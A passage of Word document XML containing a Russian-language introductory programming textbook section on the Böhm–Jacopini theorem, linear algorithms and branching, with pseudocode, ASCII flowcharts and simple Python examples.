      </w:pPr>
      <w:r>
        <w:t>Формулировка</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Теорема Бёма-Якопини (1966):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Любой алгоритм можно составить из трёх базовых управляющих структур:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Последовательность** — команды выполняются одна за другой</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Ветвление** — выбор одного из двух путей в зависимости от условия</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Цикл** — повторение последовательности команд</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Практический смысл:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Тебе не нужно придумывать какие-то новые конструкции. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Этих трёх достаточно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для решения любой задачи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Исторический контекст:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> До 1960-х годов программы писали с кучей `GOTO` (прыжков по коду в произвольные места). Код был </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>нечитаемым кошмаром</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Бём и Якопини доказали, что можно обойтись без `GOTO`, используя только эти три конструкции. Так родилось </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>структурное программирование</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Забавный факт:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Эдсгер Дейкстра в 1968 году написал знаменитую статью </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"Go To Statement Considered Harmful"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ("Оператор GOTO вреден"). После этого программисты начали массово отказываться от `GOTO` и переходить на структурное программирование. Хотя в современных языках (C, C++, Go) `goto` всё ещё есть, но его использование считается дурным тоном (если ты не пишешь ядро операционной системы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2.2. Последовательность (линейный алгоритм)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Определение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Последовательность (линейный алгоритм)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>простое выполнение команд одна за другой</w:t>
      </w:r>
      <w:r>
        <w:t>, без условий и повторений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Схема:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Команда 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>Команда 2</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>Команда 3</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓</w:t>
        <w:br/>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Каждая команда выполняется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ровно один раз</w:t>
      </w:r>
      <w:r>
        <w:t>, в строгом порядке. Никаких прыжков, никаких "если", никаких циклов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Вычисление площади прямоугольника</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Словесное описание:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Ввести длину a</w:t>
        <w:br/>
        <w:t>2. Ввести ширину b</w:t>
        <w:br/>
        <w:t>3. Вычислить площадь S = a × b</w:t>
        <w:br/>
        <w:t>4. Вывести S</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Блок-схема:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">    ⬭ Начало</w:t>
        <w:br/>
        <w:t xml:space="preserve">      |</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ▱ Ввести a</w:t>
        <w:br/>
        <w:t xml:space="preserve">      |</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ▱ Ввести b</w:t>
        <w:br/>
        <w:t xml:space="preserve">      |</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ▭ S = a × b</w:t>
        <w:br/>
        <w:t xml:space="preserve">      |</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ▱ Вывести S</w:t>
        <w:br/>
        <w:t xml:space="preserve">      |</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ⬭ Конец</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Псевдокод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Алгоритм ПлощадьПрямоугольника:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Ввести a</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Ввести b</w:t>
        <w:br/>
        <w:t xml:space="preserve">    S = a × b</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Вывести S</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>a = float(input("Длина: "))</w:t>
        <w:br/>
        <w:t>b = float(input("Ширина: "))</w:t>
        <w:br/>
        <w:t>S = a * b</w:t>
        <w:br/>
        <w:t>print(f"Площадь: {S}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Длина: 5</w:t>
        <w:br/>
        <w:t>Ширина: 3</w:t>
        <w:br/>
        <w:t>Площадь: 15</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Просто и понятно. Никаких условий, никаких повторений. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Линейный алгоритм</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это когда ты идёшь прямо, как по рельсам.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Обмен значений двух переменных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Поменять местами значения двух переменных `a` и `b`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Неправильное решение (частая ошибка):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>a = b  # Теперь a = b, но старое значение a потеряно</w:t>
        <w:br/>
        <w:t>b = a  # b = a (но a уже изменилось), поэтому b = b</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> `a = b`, `b = b`. Значение `a` потеряно. Поздравляю, ты только что сделал </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>классическую ошибку новичка</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правильное решение (с временной переменной):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>temp = a  # Сохранили старое значение a</w:t>
        <w:br/>
        <w:t>a = b     # Присвоили a значение b</w:t>
        <w:br/>
        <w:t>b = temp  # Присвоили b старое значение a</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>a = 5</w:t>
        <w:br/>
        <w:t>b = 10</w:t>
        <w:br/>
        <w:t>print(f"До обмена: a = {a}, b = {b}")</w:t>
        <w:br/>
        <w:br/>
        <w:t>temp = a</w:t>
        <w:br/>
        <w:t>a = b</w:t>
        <w:br/>
        <w:t>b = temp</w:t>
        <w:br/>
        <w:br/>
        <w:t>print(f"После обмена: a = {a}, b = {b}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>До обмена: a = 5, b = 10</w:t>
        <w:br/>
        <w:t>После обмена: a = 10, b = 5</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Красивый способ в Python (без temp):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>a, b = b, a</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Это работает благодаря </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>множественному присваиванию</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (tuple unpacking). Но это специфика Python — в C++ или Java так не сделаешь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Вычисление дискриминанта квадратного уравнения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Для уравнения \(ax^2 + bx + c = 0\) вычислить дискриминант \(D = b^2 - 4ac\).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Псевдокод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Алгоритм Дискриминант:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Ввести a, b, c</w:t>
        <w:br/>
        <w:t xml:space="preserve">    D = b² - 4 × a × c</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Вывести D</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>a = float(input("a = "))</w:t>
        <w:br/>
        <w:t>b = float(input("b = "))</w:t>
        <w:br/>
        <w:t>c = float(input("c = "))</w:t>
        <w:br/>
        <w:t>D = b**2 - 4*a*c</w:t>
        <w:br/>
        <w:t>print(f"Дискриминант: {D}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>a = 1</w:t>
        <w:br/>
        <w:t>b = -5</w:t>
        <w:br/>
        <w:t>c = 6</w:t>
        <w:br/>
        <w:t>Дискриминант: 1.0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>(Для любопытных: \(x^2 - 5x + 6 = 0 \Rightarrow x_1 = 2, x_2 = 3\))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Когда использовать последовательность?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Простые вычисления** (площадь, объём, формулы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Преобразование данных** (перевод температуры, валюты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Вывод информации** (приветствие, инструкция)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ограничения:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Линейный алгоритм </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не может принимать решения</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (для этого нужно ветвление) и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не может повторяться</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (для этого нужен цикл).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2.3. Ветвление (условный оператор)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Определение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ветвление (условный оператор)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это конструкция, которая </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>выбирает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> один из двух (или более) путей выполнения в зависимости от </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>условия</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Схема:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">    ◇ Условие?</w:t>
        <w:br/>
        <w:t xml:space="preserve">    /       \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  Да         Нет</w:t>
        <w:br/>
        <w:t xml:space="preserve">  /           \</w:t>
        <w:br/>
        <w:t>Действие 1  Действие 2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Если условие </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>истинно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (True) — выполняется одна ветка. Если </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ложно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (False) — другая.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Виды ветвлений</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Полное ветвление (if-else)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Есть два пути:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> одно действие, если условие истинно, другое — если ложно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Синтаксис (псевдокод):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Если &lt;условие&gt;, то:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;действие 1&gt;</w:t>
        <w:br/>
        <w:t>Иначе:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;действие 2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Синтаксис (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>if условие:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    действие_1</w:t>
        <w:br/>
        <w:t>else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    действие_2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример: Проверка числа на чётность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>n = int(input("Введите число: "))</w:t>
        <w:br/>
        <w:t>if n % 2 == 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("Чётное")</w:t>
        <w:br/>
        <w:t>else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("Нечётное")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Введите число: 7</w:t>
        <w:br/>
        <w:t>Нечётное</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Неполное ветвление (if без else)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Один путь:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> если условие истинно — выполняем действие, иначе — ничего не делаем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Синтаксис (псевдокод):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Если &lt;условие&gt;, то:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;действие&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример: Проверка на отрицательность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>x = int(input("Введите число: "))</w:t>
        <w:br/>
        <w:t>if x &lt; 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("Число отрицательное")</w:t>
        <w:br/>
        <w:t># Если x &gt;= 0, ничего не происходит</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение (x = -5):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Введите число: -5</w:t>
        <w:br/>
        <w:t>Число отрицательное</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение (x = 10):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Введите число: 10</w:t>
        <w:br/>
        <w:t>(Ничего не выводится)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. Множественное ветвление (if-elif-else)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Несколько условий проверяются последовательно.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Как только одно из них истинно — выполняется соответствующее действие, остальные пропускаются.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Синтаксис (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>if условие_1:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    действие_1</w:t>
        <w:br/>
        <w:t>elif условие_2:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    действие_2</w:t>
        <w:br/>
        <w:t>elif условие_3:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    действие_3</w:t>
        <w:br/>
        <w:t>else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    действие_по_умолчанию</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример: Определение знака числа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>x = int(input("Введите число: "))</w:t>
        <w:br/>
        <w:t>if x &gt; 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("Положительное")</w:t>
        <w:br/>
        <w:t>elif x &lt; 0:</w:t>
        <w:br/>
